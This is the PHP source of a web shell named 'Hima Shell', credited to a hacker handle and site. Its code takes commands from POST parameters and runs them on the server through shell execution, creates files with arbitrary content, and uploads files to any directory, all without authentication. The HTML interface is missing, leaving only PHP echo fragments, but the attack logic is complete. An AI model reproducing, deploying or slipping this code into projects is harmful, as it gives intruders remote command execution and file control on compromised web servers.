<?php
/*
         
	Software: Hima Shell
	Author: ViRuS_HiMa
	Website: www.hell-z0ne.org
	Email: egypt_government@hotmail.com
        Uploadshell.txt UploadShell.php
*/

ob_start();

# Get system informations
$server_os = @PHP_OS;
$server_uname = @php_uname();
$server_php = @phpversion();
$server_sm = @ini_get('safe_mode');

# Set generals variables
$shell_title = "Hima";
$shell_version = "v2.0";
$shell_action = $PHP_SELF;
$shell_mode = $_POST['shell_mode'];

# Set the command variables
$cmd_cnt = $_POST['command'];
$cmd_check = $_POST['cmdcheck'];

# Set the directory variables
$dir_check = $_POST['dircheck'];
$dir_change = $_POST['changedir'];
$dir_keep = $_POST['keepdir'];

# Set the files variables
$mkfile_path = $_POST['createfile'];
$mkfile_cnt = $_POST['createfilecnt'];

# Set the upload file variables
$upfile_path = $_POST['upfiledir'];
$upfile_cnt = $_POST['upfile'];

# Get the current working directory
if(!isset($dir_cur))
	$dir_cur = getcwd();

# Check if a change dir command has been sent and keep the previous directory if a new command was launch
if(isset($dir_check)) {
	if(file_exists($dir_change)) {
		if(function_exists("chdir")) {
			@chdir($dir_change);
			$dir_cur = getcwd();
		} else {
			$dir_error = "<i>Error: Cannot change directory!</i><br>\n";
		}
	} else {
		$dir_error = "<i>Error: The directory doesn't exists.</i><br>\n";
	}
} elseif(isset($dir_keep)) {
	if(file_exists($dir_keep)) {
		if(function_exists("chdir")) {
			@chdir($dir_keep);
			$dir_cur = getcwd();
		} else {
			$dir_error = "<i>Error: Cannot change directory!</i><br>\n";
		}
	} else {
		$dir_error = "<i>Error: The directory doesn't exists.</i><br>\n";
	}
}

# This execute the command specified
if(isset($cmd_check)) {
	if(@function_exists("shell_exec")) {
		$exec = $cmd_cnt;
		$tmpfile = tempnam('/tmp', $shell_title);
		$exec .= " 1> $tmpfile 2>&1; " . "cat $tmpfile; rm $tmpfile";
		$cmd_out = `$exec`;		
	} else {
		die("ERROR: the PHP version running doesn't support `shell_exec()`!  Upgrade it!\n");
	}
}

# Creates files
if(isset($mkfile_path)) {
	if(!file_exists($mkfile_path)) {
		if($mkfile_new = @fopen($mkfile_path, "w")) {
			@fputs($mkfile_new, $mkfile_cnt);
			@fclose($mkfile_new);
			$mkfile_msg = "<i>New file created: " . $mkfile_path . "</i><br>\n";
		} else {
			$mkfile_msg = "<i>Error: Permission denied!</i><br>\n";
		}
	} else {
		$mkfile_msg = "<i>Error: The file already exists.</i><br>\n";
	}
}

# Uploads files
if(isset($upfile_path)) {
	$upfile_name = $_FILES["upfile"]["name"];
	if(trim($_FILES["upfile"]["name"]) == "") {
		$upfile_msg = "<i>Error: specify a file please.</i><br>\n";
	} else {
		if(@is_uploaded_file($_FILES["upfile"]["tmp_name"])) {
			if(@move_uploaded_file($_FILES["upfile"]["tmp_name"], "$upfile_path/$upfile_name"))
				$upfile_msg = "<i>New file uploaded successfully!</i><br>\n";
			else
				$upfile_msg = "<i>Error: Permission denied!</i><br>\n";
		} else {
			$upfile_msg = "<i>Error: Cannot upload the file!</i><br>\n";
		}
	}
}

if(!$shell_mode) {
?><?php echo $shell_title; ?><?php echo $shell_title; ?><?php echo $server_os; ?><?php echo $server_uname; ?><?php echo $server_php; ?><?php
					if($server_sm)
						echo "ON";
					else
						echo "OFF";
				?><?php echo $shell_action; ?><?php echo $shell_action; ?><?php
						# Nothing special, just print the command launched
						if(isset($cmd_check))
							echo "Result for command: <b>" . $cmd_cnt . "</b>&nbsp;&nbsp;&nbsp;[ <a href=\"\">Pin Up</a> ]";
						else
							echo "Output:";
					?><?php echo $cmd_out; ?><?php
						# This permit to keep the directory if has been previously changed
						if(isset($dir_check))
							echo "<input type=\"hidden\" name=\"keepdir\" value=\"" . $dir_change . "\">\n";
						else
							echo "<input type=\"hidden\" name=\"keepdir\" value=\"" . $dir_cur . "\">\n";
					?><?php echo $dir_cur; ?><?php echo $dir_error; ?><?php echo $shell_action; ?><?php echo $upfile_msg; ?><?php echo $shell_action; ?><?php echo $dir_cur; ?><?php echo $mkfile_msg; ?><?php echo $shell_action; ?><?php echo $dir_cur . "/"; ?>